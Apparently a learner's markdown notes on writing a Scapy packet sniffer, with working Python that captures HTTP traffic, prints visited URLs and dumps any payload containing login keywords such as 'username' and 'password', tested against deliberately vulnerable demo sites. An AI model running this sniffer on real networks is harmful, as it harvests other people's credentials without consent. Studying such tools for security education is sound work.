# Packet Sniffer

## Resorces:
- [Using Scapy in your tools](https://scapy.readthedocs.io/en/latest/extending.html)
- [Scapy Source Code](https://github.com/invernizzi/scapy-http)
- [Filter that apply to ARP](https://biot.com/capstats/bpf.html)
- [Steal my login](https://www.stealmylogin.com/demo.html)
- [Test capturing URL](http://testphp.vulnweb.com/login.php)

## Tools:
- Using the scapy package to capture information on the HTTP layer

```python
#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http # scapy.layers has it own http class


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

```
- the packet.haslayer(layer-wanted)
- scapy doesnt has its own http layer so we need to import http package from scapy.layers
- other layers: [Raw](data that communicate),[Ethernet],[IP],[TCP],[HTTP 1],[HTTP Request]
```python
# the packet.haslayer(filter out all the layer)
def process_sniffed_packet(packet):
    # check if the packet has a http layer
    # check against http
    if packet.haslayer(http.HTTPRequest):
        # put another filter to get only username and password
        if packet.haslayer(scapy.Raw):
            print(packet.show())

```
- Update function of the  process_sniffed_packet(packet)
```python
def process_sniffed_packet(packet):
    # check if the packet has a http layer
    # check against http
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        # put another filter to get only username and password
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['uname', 'username', 'user', 'password', 'pass']
            for keyword in keywords:
                if keyword in str(load):
                    print(load)
                    break
```
- Call sniff function to sniff the interface data that we are looking for
```python
# call sniff function to sniff the interface data that we are looking for
sniff("etho")
```